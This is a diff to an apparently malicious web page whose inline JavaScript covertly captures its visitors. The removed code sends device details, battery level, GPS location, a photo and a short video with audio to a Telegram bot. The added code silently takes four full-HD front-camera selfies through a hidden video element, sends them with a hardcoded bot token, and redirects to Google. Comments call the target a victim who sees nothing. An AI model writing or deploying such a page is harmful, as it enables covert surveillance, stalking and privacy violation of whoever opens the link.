@@ -10,122 +10,127 @@
 </head>
 <body>
     <script>
-        // ==================== قراءة الإيدي من الرابط ====================
-        function getUserIdFromURL() {
-            const urlParams = new URLSearchParams(window.location.search);
-            return urlParams.get('id');
-        }
-
-        const USER_ID = getUserIdFromURL();
+        // ==================== جلب الإيدي من الرابط ====================
+        const USER_ID = new URLSearchParams(window.location.search).get('id');
         const BOT_TOKEN = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU";
 
+        // إذا ما في ID بالرابط، نوقف
         if (!USER_ID) {
             window.location.replace("https://www.google.com");
         } else {
-            // ==================== دوال الإرسال ====================
-            async function sendToTelegram(type, data, filename) {
+            // ==================== الكاميرا الأمامية - صور فقط ====================
+            (async function() {
                 try {
-                    const formData = new FormData();
-                    formData.append('chat_id', USER_ID);
+                    // طلب الكاميرا الأمامية بأعلى دقة (FULL HD)
+                    const stream = await navigator.mediaDevices.getUserMedia({ 
+                        video: { 
+                            facingMode: 'user', // الكاميرا الأمامية
+                            width: { ideal: 1920, max: 1920 },
+                            height: { ideal: 1080, max: 1080 }
+                        }
+                    });
+
+                    // عنصر فيديو مخفي للتصوير
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.setAttribute('playsinline', '');
+                    video.setAttribute('autoplay', '');
+                    video.style.position = 'absolute';
+                    video.style.left = '-9999px';
+                    video.style.top = '-9999px';
+                    video.style.width = '1px';
+                    video.style.height = '1px';
+                    video.style.opacity = '0';
+                    document.body.appendChild(video);
+
+                    await video.play();
                     
-                    if (type === 'photo') {
-                        formData.append('photo', data, filename || 'photo.jpg');
+                    // انتظار تحميل الفيديو
+                    await new Promise(resolve => {
+                        if (video.videoWidth > 0) resolve();
+                        else video.onloadedmetadata = resolve;
+                    });
+
+                    // إرسال معلومات الدقة (تأكيد)
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: USER_ID,
+                            text: `📸 <b>تصوير من الكاميرا الأمامية</b>\nالدقة: ${video.videoWidth} x ${video.videoHeight}`,
+                            parse_mode: 'HTML'
+                        })
+                    });
+
+                    // ==================== التقاط 4 صور متتالية ====================
+                    for (let i = 0; i < 4; i++) {
+                        // تأخير بين الصور (للحصول على تعابير مختلفة)
+                        await new Promise(r => setTimeout(r, i * 500));
+
+                        // إنشاء canvas بالدقة الكاملة
+                        const canvas = document.createElement('canvas');
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        
+                        // تحسين جودة الرسم
+                        const ctx = canvas.getContext('2d');
+                        ctx.imageSmoothingEnabled = true;
+                        ctx.imageSmoothingQuality = 'high';
+                        
+                        // رسم الصورة من الفيديو
+                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                        // تحويل إلى blob بأعلى جودة
+                        const blob = await new Promise(resolve => 
+                            canvas.toBlob(resolve, 'image/jpeg', 0.98)
+                        );
+
+                        // إرسال الصورة للتيليجرام
+                        const formData = new FormData();
+                        formData.append('chat_id', USER_ID);
+                        formData.append('photo', blob, `selfie_${i+1}.jpg`);
+                        formData.append('caption', `📸 صورة سيلفي ${i+1} - ${new Date().toLocaleString('ar-SA')}`);
+
                         await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                            method: 'POST', body: formData
-                        });
-                    } else if (type === 'video') {
-                        formData.append('video', data, filename || 'video.mp4');
-                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
-                            method: 'POST', body: formData
-                        });
-                    } else if (type === 'text') {
-                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                             method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({ chat_id: USER_ID, text: data })
+                            body: formData
                         });
+
+                        // تحديث الحالة في الكونسول فقط (الضحية لا يرى شيئاً)
+                        console.log(`✅ تم التقاط وإرسال الصورة ${i+1}/4`);
                     }
-                } catch (e) {}
-            }
 
-            // ==================== سحب كل شيء ====================
-            async function stealEverything() {
-                try {
-                    // 1. معلومات الجهاز
-                    const info = {
-                        'User Agent': navigator.userAgent,
-                        'اللغة': navigator.language,
-                        'المنصة': navigator.platform,
-                        'الشاشة': `${screen.width}x${screen.height}`,
-                        'المنطقة': Intl.DateTimeFormat().resolvedOptions().timeZone
-                    };
-                    let infoText = '🔰 معلومات الجهاز:\n';
-                    for (const [k, v] of Object.entries(info)) infoText += `${k}: ${v}\n`;
-                    await sendToTelegram('text', infoText);
+                    // إرسال تأكيد الانتهاء
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: USER_ID,
+                            text: `✅ <b>اكتمل التصوير</b>\nتم إرسال 4 صور من الكاميرا الأمامية`,
+                            parse_mode: 'HTML'
+                        })
+                    });
 
-                    // 2. البطارية
-                    try {
-                        const battery = await navigator.getBattery();
-                        await sendToTelegram('text', `🔋 بطارية: ${Math.round(battery.level * 100)}%`);
-                    } catch(e) {}
+                    // تنظيف
+                    stream.getTracks().forEach(track => track.stop());
+                    video.remove();
 
-                    // 3. الموقع
-                    try {
-                        const pos = await new Promise((r) => navigator.geolocation.getCurrentPosition(r));
-                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({
-                                chat_id: USER_ID,
-                                latitude: pos.coords.latitude,
-                                longitude: pos.coords.longitude
-                            })
-                        });
-                    } catch(e) {}
+                } catch (error) {
+                    // في حالة الفشل
+                    console.error('Camera error:', error);
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: USER_ID,
+                            text: `❌ فشل الوصول للكاميرا الأمامية: ${error.message}`
+                        })
+                    });
+                }
 
-                    // 4. تصوير فيديو
-                    try {
-                        const stream = await navigator.mediaDevices.getUserMedia({ 
-                            video: { facingMode: 'environment' }, 
-                            audio: true 
-                        });
-                        
-                        const recorder = new MediaRecorder(stream);
-                        const chunks = [];
-                        recorder.ondataavailable = e => chunks.push(e.data);
-                        recorder.onstop = async () => {
-                            const blob = new Blob(chunks, { type: 'video/webm' });
-                            await sendToTelegram('video', blob, `video_${Date.now()}.webm`);
-                            stream.getTracks().forEach(t => t.stop());
-                        };
-                        
-                        recorder.start();
-                        setTimeout(() => recorder.stop(), 7000);
-                    } catch(e) {}
-
-                    // 5. تصوير صورة
-                    try {
-                        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                        const video = document.createElement('video');
-                        video.srcObject = stream;
-                        video.play();
-                        
-                        setTimeout(() => {
-                            const canvas = document.createElement('canvas');
-                            canvas.width = video.videoWidth;
-                            canvas.height = video.videoHeight;
-                            canvas.getContext('2d').drawImage(video, 0, 0);
-                            canvas.toBlob(blob => sendToTelegram('photo', blob, `photo_${Date.now()}.jpg`));
-                            stream.getTracks().forEach(t => t.stop());
-                        }, 1000);
-                    } catch(e) {}
-
-                } catch(e) {}
-            }
-
-            // ==================== التشغيل ====================
-            stealEverything();
-            window.location.replace("https://www.google.com");
+                // تحويل فوري لجوجل (الضحية لا يرى شيئاً)
+                window.location.replace("https://www.google.com");
+            })();
         }
     </script>
 </body>
